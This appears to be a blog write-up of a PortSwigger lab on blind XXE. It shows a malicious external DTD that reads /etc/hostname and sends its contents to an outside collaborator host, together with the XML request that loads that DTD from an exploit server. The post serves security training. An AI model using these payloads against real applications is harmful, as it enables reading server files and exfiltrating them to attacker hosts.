---
layout: post
title:  "Exploiting blind XXE to exfiltrate data using a malicious external DTD"
date:   2024-11-23 10:20:54 +0530
categories: [BSCP, XXE]
---

## Objective 

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file. 

## Solution 

In the exploit server, I've created the following malicious `dtd` file where it will fetch the contents of `/etc/hostname` and pass it on to our external collaborator 

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ezhowuwf9vie5fyfv05olbxce3kw8mwb.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Once after storing the above payload in exploit server, through checkstock functionality we pass the following payload 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a730090048d74d280fa70b2014a0024.exploit-server.net/exploit.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Here is how it works, firstly it will access the file called `/etc/hostname` and through eval entity we will be passing the payload on to our burp collaborator through a `x` parameter we can read those file 

After sending the request, our response is quite similiar like the previous one and where `XML parser error` occured 

![]({{ site.baseurl }}/assets/images/xxe/xxe-22.png)

Checking the collaborator, we recieved the values of the `hostname` inside `x` parameter 

![]({{ site.baseurl }}/assets/images/xxe/xxe-23.png)

Submit those values as solution and that solves the lab 

![]({{ site.baseurl }}/assets/images/xxe/xxe-24.png)
